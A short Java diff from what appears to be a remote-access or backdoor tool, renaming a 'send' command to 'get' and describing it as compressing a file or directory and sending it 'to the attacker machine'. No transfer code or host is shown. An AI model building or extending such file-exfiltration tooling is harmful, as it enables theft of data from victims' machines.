@@ -6,11 +6,11 @@ import java.net.Socket;
 import connection.Connection;
 import connection.Server;
 
-public class SendCommand extends Command{
+public class GetCommand extends Command{
 	private String _command;
 	
-	public SendCommand() {
-		super("send", "\"file/dir\"", "compress and sends the specified file/dir");
+	public GetCommand() {
+		super("get", "\"file/dir\"", "compress and sends the specified file/dir to the attacker machine");
 	}
 
 	protected boolean parse(String command) {
